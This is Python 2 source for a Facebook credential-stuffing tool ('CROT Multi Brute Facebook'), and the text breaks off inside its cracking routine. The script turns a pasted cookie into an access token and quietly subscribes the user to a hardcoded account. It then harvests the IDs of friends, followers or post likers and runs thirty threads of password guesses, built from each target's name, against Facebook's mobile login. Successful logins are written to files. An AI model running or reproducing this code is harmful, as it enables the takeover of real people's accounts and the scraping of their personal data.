# coding:utf-8
#terbobol oleh hakiki
#tool version 3++
#tools decrypt

#!/usr/bin/python2
# coding=utf-8
# code by Yayan XD
# my facebook ( https://www.facebook.com/KM39453 )
import os,sys,uuid,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,bs4
from multiprocessing.pool import ThreadPool
def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')

#### WARNA RANDOM ####
P  = '\033[1;97m'  # putih
M  = '\033[1;91m' # merah
H  = '\033[1;92m' # hijau
K = '\033[1;93m' # kuning
B  = '\033[1;94m' # biru
U  = '\033[1;95m' # ungu
O = '\033[1;96m' # biru cerah
I = '\033[0m' # mati
my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)

try:
        import mechanize
except ImportError:
        os.system("pip2 install mechanize")
try:
        import requests
except ImportError:
        os.system("pip2 install requests bs4")
        os.system("python2 cmbf.py")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
useragents = [
 ('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
hm = random.choice(useragents)
reload(sys)
sys.setdefaultencoding('utf8')
os.system('clear')
animasi = ["[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]", "[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■]","[■■■□□□□□□□□□□□]","[■■■■□□□□□□□□□□]", "[■■■■■□□□□□□□□□]", "[■■■■■■□□□□□□□□]", "[■■■■■■■□□□□□□□]", "[■■■■■■■■□□□□□□]", "[■■■■■■■■■□□□□□]", "[■■■■■■■■■■□□□□]", "[■■■■■■■■■■■□□□]", "\x1b[0;92m[■■■■■■■■■■■■■■] Suskes !"]
for i in range(len(animasi)):
    time.sleep(0.01)
    sys.stdout.write("\r\x1b[0;92m loading \x1b[0;96m: "+ random.choice(['\x1b[0;93m', '\x1b[0;96m', '\x1b[0;95m', '\x1b[0;96m', '\x1b[0;95m']) + animasi[i % len(animasi)])
    sys.stdout.flush()

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', hm)]
s = requests.Session()
api = 'https://graph.facebook.com/{}'
hea = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'}

def keluar():
        print " [!] Byeee kontol"
        os.sys.exit()

def hapus():
	os.system('clear')
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
	
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')

def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)
    
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m [\033[0;94m•\033[0;97m]\033[0;97m Please Wait\033[0;93m "+o),;sys.stdout.flush();time.sleep(1)


def tok():
	titik = ['.   ','..  ','... ']
	for ah in titik:
		print("\r\033[0;97m [\033[0;93m*\033[0;97m]\033[0;97m Generating your key\033[0;92m "+ah),;sys.stdout.flush();time.sleep(1)



logo ='''\033[1;97m
    ______     __    __     ______     ______  
   /\  ___\   /\ "-./  \   /\  == \   /\  ___\ ®
   \ \ \____  \ \ \-./\ \  \ \  __<   \ \  __\ 
    \ \_____\  \ \_\ \ \_\  \ \_____\  \ \_\   
     \/_____/   \/_/  \/_/   \/_____/   \/_/ 
         \033[1;32m * \033[1;33mCROT \033[1;35mMULTI\033[1;37m BRUTE\033[1;36m FACEBOOK \033[1;32m*  \033[1;37m
     ----------------------------------------\n'''
logo2='''   \033[1;97m
     ._______ ._____.___ ._______ ._______
     :_.  ___\:         |: __   / :_ ____/ ®
     |  : |/\ |   \  /  ||  |>  \ |   _/  
     |    /  \|   |\/   ||  |>   \|   |   
     |. _____/|___| |   ||_______/|_. |   
      :/            |___|           :/    
      :  \033[1;31mCROT \033[1;36mMULTI \033[1;33mBRUTE \033[1;34mFACEBOOK \033[1;37m :     
     ---------------------------------\n'''

pw = False
back = 0
loop = 0
threads = []
ok = []
cp = []
id = []
Successful = []
Checkpoint = []
done = []
pw = []
target = []

### LISENSI ###
def license():
	try:
		toket = open('license.txt','r').read()
	except IOError:
		print "\033[1;91m[!] License Invalid !"
		os.system('clear')
		os.system('rm -rf license.txt')
		asup()
	if os.path.exists('license.txt'): #dev YayanXD
		gagal()
	else:
		asup()
#### ASUP ###
def asup():
    os.system('clear')
    print logo
    print "\033[1;94m------------------------------------------------------"
    tok()
    time.sleep(2)
    id = uuid.uuid4().hex[:25]
    idg = open('license.txt', 'w')
    idg.write(id)
    idg.close()
    jalan( '\033[1;97m\n [\033[1;93m•\033[1;97m] Key : \x1b[92m' + id)
    time.sleep(1)
    print '\033[1;97m [\033[1;92m✓\033[1;97m] Key Generating Success'
    time.sleep(1)
    print '\033[1;97m [\033[1;92m*\033[1;97m] Your Key Has Not Been Confirmed'
    print '\033[1;97m [\033[1;94m*\033[1;97m] Please Contact Admin for Key Confirmation'
    raw_input('\033[1;97m [\033[1;94m>\033[1;97m] Press Enter to Chat Admin ')
    os.system('am start https://wa.me/6285722391529?text=Hi,%20YayanXD%20please%20confirm%20my%20key%20Key%20:%20' + id + ' >/dev/null')
    time.sleep(1)
    exit()
### GAGAL ###
def gagal():
    try:
        j = open('license.txt', 'r').read()
        r = requests.get('https://z4k1c.github.io/kontol/Licens.txt').text ### change your link github
        if j in r:
            os.system("clear")
            print logo2
            print 50* "\033[1;94m-"
            jalan( '\033[1;97m\n [\033[1;92m✓\033[1;97m] Login Status\x1b[1;92m Complete')
            time.sleep(2)
            moch_yayan()
        else:
            os.system("clear")
            print logo
            print "\033[1;94m------------------------------------------------------"
            print '\033[1;97m [\033[1;91m×\033[1;97m] Login Status : \033[1;91mFailed'
            time.sleep(1)
            print '\033[1;97m [\033[1;94m•\033[1;97m] Key Not Confirmed'
            print '\033[1;97m [\033[1;94m•\033[1;97m] Please Chat Admin For Confirmed Your Key'
            raw_input('\033[1;97m [\033[1;94m>\033[1;97m] Press Enter To Chat Admin ')
            os.system('am start https://wa.me/6285603036683?text=Hi,+YayanXD+please+confirm+my+key+Key+:%20' + j + ' >/dev/null')
            exit()
    except requests.exceptions.ConnectionError:
        print '\033[1;97m\n [\033[1;91m!\033[1;97m] No Connection'
        raw_input('\033[1;97m [\033[1;92m>\033[1;97m] Back')
        license()
    except KeyboardInterrupt:
        os.sys.exit()
    except IOError:
        subprocess.Popen(['rm', '-rf', 'license.txt'])
        asup()
        
### MASUK ###
def masuk():
        os.system("clear")
        print logo
        print "\n ["+O+"1"+I+"] Login using Cookise Facebook"
        print " ["+O+"2"+I+"] Login using Facebook token"+"\n"
        pilih()

#input pilihan
def pilih():
        m = raw_input(" [*] choose : ")
        if m =="":
                print "\n [!] choose really stupid!!"
                time.sleep(2)
                os.system("clear")
                masuk()
        elif m =="1":
                cookies()
        elif m =="2":
                tokenz()
        else:
                print "\n [!] choose really stupid!!"
                time.sleep(2)
                os.system("clear")
                masuk()

#masuk dengan cookies
def cookies():
	os.system("clear")
        print logo2
        cookie = raw_input("\n \033[1;97m[?] cookies :\033[1;92m ")
        tik()
        try:
                data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
                'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
                'referer'                   : 'https://m.facebook.com/',
                'host'                      : 'm.facebook.com',
                'origin'                    : 'https://m.facebook.com',
                'upgrade-insecure-requests' : '1',
                'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control'             : 'max-age=0',
                'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'content-type'              : 'text/html; charset=utf-8'
                }, cookies = {
                'cookie'                    : cookie
                })
                find_token = re.search('(EAAA\w+)', data.text)
                hasil    = '\n* Fail : maybe your cookie invalid !!' if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print "   [!] tidak ada koneksi jaringan internet"
        cookie = open("login.txt", 'w')
        cookie.write(find_token.group(1))
        cookie.close()
        jalan('\n\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Login successful')
        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token='+find_token.group(1))
        time.sleep(1)
        moch_yayan()

### LOGIN TOKEN ###
def tokenz():
    os.system('clear')
    print logo2
    token = raw_input('\n [?] Token : \x1b[1;92m')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(token)
        zedd.close()
        jalan('\n\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Login successful')
        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token='+token)
        moch_yayan()
    except KeyError:
        print '\n\n \x1b[1;97m[\x1b[1;93m!\x1b[1;97m] Wrong Token'
        os.system('xdg-open https://youtu.be/xc06cplt3FU')
        time.sleep(1)
        os.system('clear')
        masuk()
### ORANG GANTENG ###
def moch_yayan():
	os.system('clear')
	try:
		token=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print " [!] Cookies/token Invalid"
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+token)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print " [!] Cookies/token Invalid"
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	except requests.exceptions.ConnectionError:
		print " [!] no connection"
		exit()
        ip = requests.get("https://api.ipify.org").text
        key = open('license.txt', 'r').read()
        os.system("clear")
        print logo
        print "\x1b[1;97m------------------------------------------------------"
        print " [*] Gitbub   :\033[0m https://github.com/Yayan-XD"
        print " \x1b[1;97m[*] Facebook :\033[0m https://www.facebook.com/KM39453"
        print "\x1b[1;97m------------------------------------------------------"
        print " \x1b[1;97m[*] Welcome  : %s%s%s"%(K,nama,I)+" "
        print " \x1b[1;97m[*] Your Key : %s%s%s"%(H,key,I)+" "
        print " \x1b[1;97m[*] Your IP  : %s%s%s"%(M,ip,I)+" "
        print "\x1b[1;97m------------------------------------------------------\n"
        print " [1] Dump id from friends"
        print " [2] Dump id from friends public"
        print " [3] Dump id from total followers"
        print " [4] Dump id from link post"
        print " [5] Start crack"
        print " [0] Exit"
        pilih_kontol()

def pilih_kontol():
        yan = raw_input("\n [*] choose : ")
        if yan == '':
           print '\n \x1b[1;97m[\x1b[1;93m!\x1b[1;97m] Wrong Input'
           time.sleep(1.7)
           os.system('clear')
           moch_yayan()
        elif yan =="1":
                teman()
        elif yan =="2":
                publik()
        elif yan =="3":
                followers()
        elif yan =="4":
                postingan()
        elif yan =="5":
                crack()
                exit()
        elif yan =="0":
                os.system('rm -rf login.txt')
                exit()
        else:
            print '\n \x1b[1;97m[\x1b[1;93m!\x1b[1;97m] Wrong Input'
            time.sleep(0.2)
            os.system('clear')
            moch_yayan()
### CRACK TEMAN ###
def teman():
        global token
        try:
                token=open('login.txt','r').read()
        except IOError:
                exit(" [!] token invalid ")
        ih = raw_input("\n [?] file name : ")
        if ih in [""]:
                exit("\n [!] the correct content")    
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".txt","w")
        try:
            for i in s.get(api.format("me/friends?access_token=%s"%(token)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r [*] dump %s please wait "%(len(id)
                    ));sys.stdout.flush()
                    time.sleep(0.0050)
            wrt.close()
            print "\n\n [✓] successfully dump friend id\n"
            exit(" [•] files save in : dump/%s.txt "%(ih))
        except OSError:
            exit("\n [!] failed to save file")
### CRACK PUBLIK ###
def publik():
        global token
        try:
                token=open('login.txt','r').read()
        except IOError:
                exit(" [!] token invalid ")
        ah = raw_input(" [?] id public : ")
        ih = raw_input(" [?] file name : ")
        asw = raw_input(" [?] limit : ")
        if asw in [""]:
            exit("\n [!] the correct content")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".txt","w")
        try:
            for i in  s.get(api.format("%s/friends?limit=%s&access_token=%s"%(ah,asw,token)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r [*] id %s total dump %s please wait "%(i["id"],len(id)
                    ));sys.stdout.flush()
                    time.sleep(0.0050)
            wrt.close()
            print "\n\n [✓] successfully dump the public id\n"
            exit(" [•] files save in : dump/%s.txt "%(ih))
        except OSError:
            exit("\n [!] failed to save file")
### CRACK FOLLOWERS ###
def followers():
        global token
        try:
                token=open('login.txt','r').read()
        except IOError:
                exit(" [!] token invalid ")
        ih = raw_input("\n [?] id followers : ")
        ah = raw_input(" [?] file name : ")
        asw = raw_input(" [?] limit : ")
        if ih in [""]:
                exit( "\n [!] the correct content")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ah+".txt","w")
        try:
            for i in  s.get(api.format("%s/subscribers?limit=%s&access_token=%s"%(ih,asw,token)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r [*] id %s total dump %s please wait "%(i["id"],len(id)
                    ));sys.stdout.flush()
                    time.sleep(0.0050)
            wrt.close()
            print "\n [✓] successfully dump id followers\n"
            exit(" [•] file save in : dump/%s.txt "%(ah))
        except OSError:
            exit("\n [!] failed to save file")
### CRACK POSTINGAN ###
def postingan():
        global token
        try:
                token=open('login.txt','r').read()
        except IOError:
                exit(" [!] token invalid ")
        ah = raw_input(" [?] id post : ")
        ih = raw_input(" [?] file name : ")
        asw = raw_input(" [?] limit : ")
        if ah in [""]:
            exit("\n [!] the correct content")
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".txt","w")
        try:
            for i in  s.get(api.format("%s/likes?limit=%s&access_token=%s"%(ah,asw,token)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r [*] id %s total dump %s please wait "%(i["id"],len(id)
                    ));sys.stdout.flush()
                    time.sleep(0.0050)
            wrt.close()
            print "\n [✓] successfully dump post\n"
            exit(" [*] file save in : dump/%s.txt "%(ih))
        except OSError:
                exit("\n [!] failed to save file")
### MULAI PENGECROTAN ###
logoz=('''\033[1;92m    __________  __________  __ __
   / ____/ __ )/ ____/ __ \/ //_/
  / /_  / __  / /   / / / / ,<   
 / __/ / /_/ / /___/ /_/ / /| |  
/_/   /_____/\____/\____/_/ |_|  
                                 ''')
def crack():
        global token
        try:
                token=open('login.txt','r').read()
        except IOError:
                exit(" [!] token invalid ")
        ask = raw_input(" [?] password manual [y/n]: ")
        if ask.lower() == "y":
                man()
        os.system('clear')
        print (logoz)
        file=raw_input(" [?] file dump : ")
        if file in [""]:
                exit(" [!] wrong file")
        try:
                fil = open(file,"r").readlines()
                for id in fil:
                        target.append(id.strip())
        except KeyError:
                exit(" [!] file does not exist")
        print "\n [+] OK results saved to : ok.txt\n [-] CP results saved to : cp.txt\n"
        print " [!] press ctrl + z to pause the process\n"
        os.system('clear')
        print (logoz)
        print '\033[1;97m═══════════════════════════════════════════════\n'
        try:
                os.mkdir("crack")
        except:
                pass
        m=ThreadPool(30)
        m.map(crack_mbasic,target)
        results(Successful,Checkpoint)
        exit()

def crack_mbasic(user):
	global loop
	try:
		a = s.get(api.format('%s?access_token=%s' % (user, token)), headers=hea).json()
		dp = a['first_name'].lower()
		bk = a['last_name'].lower()
		tl = a['birthday'].lower()
		for password in [dp+'123',dp+'12345',bk+'123',bk+'12345','sayang', 'bangsat', 'poiqwe']:
			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': password, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\r\x1b[1;32m ---> [OK]  ' +user+ ' | ' +password+ ''
				Successful.append(user+' | '+password)
				save = open('ok.txt','a')
				save.write(str(user)+' | '+str(password)+'\n')
				save.close()
				break
			elif 'checkpoint' in xo:
				print '\r\x1b[1;33m ---> [CP] ' +user+ ' | ' +password+ '|' +tl
				Checkpoint.append(user+' | '+password)
				save = open('cp.txt','a')
